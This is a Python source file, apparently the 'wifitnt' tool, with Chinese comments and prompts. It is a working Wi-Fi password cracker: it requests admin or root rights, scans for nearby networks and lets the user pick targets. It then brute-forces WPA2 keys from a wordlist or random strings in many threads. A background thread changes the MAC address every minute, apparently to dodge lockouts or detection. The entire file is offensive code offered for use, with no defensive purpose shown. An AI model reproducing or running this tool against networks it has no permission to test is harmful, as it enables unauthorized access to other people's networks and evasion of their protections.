import sys
import os
import time
import random
import threading
import subprocess
import pywifi

# ========== 权限检测 ==========
def check_admin():
    if os.name == 'nt':
        import ctypes
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("检测到未以管理员身份运行，正在请求管理员权限...")
                params = ' '.join([f'"{x}"' for x in sys.argv])
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
                sys.exit(0)
        except Exception as e:
            print(f"管理员权限检测失败: {e}")
            sys.exit(1)
    else:
        if os.geteuid() != 0:
            print("请以 root 权限运行该程序（sudo python3 xxx.py）")
            sys.exit(1)

# ========== 生成随机 MAC ==========
def random_mac():
    return "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )

# ========== 修改 MAC 地址 ==========
def change_mac(interface_name):
    new_mac = random_mac()
    print(f"[MAC] 正在更换 {interface_name} 的 MAC 地址为: {new_mac}")
    try:
        if os.name == 'nt':
            import winreg
            subprocess.run(f'netsh interface set interface name="{interface_name}" admin=disable', shell=True, check=True)
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r'SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}',
                                 0, winreg.KEY_ALL_ACCESS)
            i = 0
            found = False
            while True:
                try:
                    subkey = winreg.EnumKey(key, i)
                    subkey_path = r'SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\\' + subkey
                    subkey_handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path, 0, winreg.KEY_ALL_ACCESS)
                    try:
                        name, _ = winreg.QueryValueEx(subkey_handle, 'NetCfgInstanceId')
                        if interface_name in name:
                            winreg.SetValueEx(subkey_handle, 'NetworkAddress', 0, winreg.REG_SZ, new_mac.replace(':', ''))
                            found = True
                            break
                    except Exception:
                        pass
                    finally:
                        winreg.CloseKey(subkey_handle)
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(key)
            if not found:
                print("[MAC] 未找到对应网卡注册表项，MAC 更换失败。")
            subprocess.run(f'netsh interface set interface name="{interface_name}" admin=enable', shell=True, check=True)
        else:
            subprocess.run(f"ip link set dev {interface_name} down", shell=True, check=True)
            subprocess.run(f"ip link set dev {interface_name} address {new_mac}", shell=True, check=True)
            subprocess.run(f"ip link set dev {interface_name} up", shell=True, check=True)
    except Exception as e:
        print(f"[MAC] 更换 MAC 地址失败: {e}")

# ========== WiFi 破解核心 ==========
found_event = threading.Event()
lock = threading.Lock()

def try_password(interface, ssid, pwd):
    if found_event.is_set():
        return False
    p = pywifi.Profile()
    p.ssid = ssid
    p.auth = pywifi.const.AUTH_ALG_OPEN
    p.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    p.cipher = pywifi.const.CIPHER_TYPE_CCMP
    with lock:
        interface.remove_all_network_profiles()
        p.key = pwd
        tmp_profile = interface.add_network_profile(p)
        interface.connect(tmp_profile)
    time.sleep(3)
    if interface.status() == pywifi.const.IFACE_CONNECTED:
        print(f"[SUCCESS] 网卡: {interface.name()} | SSID: {ssid} | 密码: {pwd}")
        found_event.set()
        interface.disconnect()
        return True
    else:
        interface.disconnect()
        return False

def worker(interface, ssid, passwords):
    for pwd in passwords:
        if found_event.is_set():
            break
        try_password(interface, ssid, pwd)

def mac_changer_thread(interface):
    while not found_event.is_set():
        change_mac(interface.name())
        for _ in range(60):
            if found_event.is_set():
                break
            time.sleep(1)

# ========== 主程序 ==========
def main():
    check_admin()

    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    print("可用的无线网卡：")
    for idx, iface in enumerate(interfaces):
        print(f"{idx}: {iface.name()}")

    choices = input("请选择要使用的无线网卡编号（可用逗号分隔多个）: ")
    choice_list = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit() and int(x.strip()) < len(interfaces)]
    if not choice_list:
        print("未选择有效网卡，退出。")
        sys.exit(1)

    selected_interfaces = [interfaces[i] for i in choice_list]
    wifiList = []
    for interface in selected_interfaces:
        retries = 3
        while retries > 0:
            interface.scan()
            print(f"[{interface.name()}] 扫描中，请稍候...")
            time.sleep(5)
            results = interface.scan_results()
            if results:
                wifiList.extend(results)
                print(f"[{interface.name()}] 扫描完成！")
                break
            else:
                retries -= 1
                print(f"[{interface.name()}] 扫描失败，重试中...")
        else:
            print(f"[{interface.name()}] 扫描多次失败。")

    ssid_dict = {}
    for w in wifiList:
        ssid = w.ssid.encode('raw_unicode_escape').decode('utf-8')
        if ssid and (ssid not in ssid_dict or (100 + w.signal) > ssid_dict[ssid][0]):
            ssid_dict[ssid] = (100 + w.signal, ssid)
    wifi_signal_and_name_list = sorted(ssid_dict.values(), key=lambda i: i[0], reverse=True)

    for idx, (signal, name) in enumerate(wifi_signal_and_name_list):
        print(f"{idx}\t信号: {signal}\tSSID: {name}")

    mode = input("请选择密码模式（1-密码本，2-随机生成）: ").strip()
    while mode not in ('1', '2'):
        mode = input("输入有误，请重新选择（1-密码本，2-随机生成）: ").strip()

    wifi_indices = input("请选择要破解的WiFi编号（可用逗号分隔多个）: ")
    wifi_index_list = [int(x.strip()) for x in wifi_indices.split(',') if x.strip().isdigit() and int(x.strip()) < len(wifi_signal_and_name_list)]
    if not wifi_index_list:
        print("未选择有效WiFi，退出。")
        sys.exit(1)
    target_ssids = [wifi_signal_and_name_list[i][1] for i in wifi_index_list]

    if mode == '1':
        password_file = input("请输入密码本路径: ")
        try:
            with open(password_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"读取密码本失败: {e}")
            sys.exit(1)
    else:
        min_len = int(input("随机密码最小长度: "))
        max_len = int(input("随机密码最大长度: "))
        count = int(input("生成密码数量: "))
        charset = input("请输入字符集（留空默认字母数字）: ") or 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        passwords = [''.join(random.choices(charset, k=random.randint(min_len, max_len))) for _ in range(count)]
        print(f"已生成 {len(passwords)} 个随机密码。")

    print(f"开始破解: {', '.join(target_ssids)}")

    # 启动 MAC 更换线程
    for interface in selected_interfaces:
        threading.Thread(target=mac_changer_thread, args=(interface,), daemon=True).start()

    num_threads = min(8, len(passwords))
    chunk_size = len(passwords) // num_threads + 1
    threads = []
    for interface in selected_interfaces:
        for ssid in target_ssids:
            for i in range(num_threads):
                chunk = passwords[i*chunk_size:(i+1)*chunk_size]
                if chunk:
                    t = threading.Thread(target=worker, args=(interface, ssid, chunk))
                    threads.append(t)
                    t.start()

    for t in threads:
        t.join()

    if not found_event.is_set():
        print("未能破解所选 WiFi。")

def printversion(version):
    print(
'''
Welcome to
 _       ________________   _______   ________
| |     / /  _/ ____/  _/  /_  __/ | / /_  __/
| | /| / // // /_   / /     / / /  |/ / / /   
| |/ |/ // // __/ _/ /     / / / /|  / / /    
|__/|__/___/_/   /___/    /_/ /_/ |_/ /_/ 
https://github.com/xhdndmm/wifitnt
'''
, "version:" , version
)

if __name__ == "__main__":
    printversion("v1.1-beta")
    main()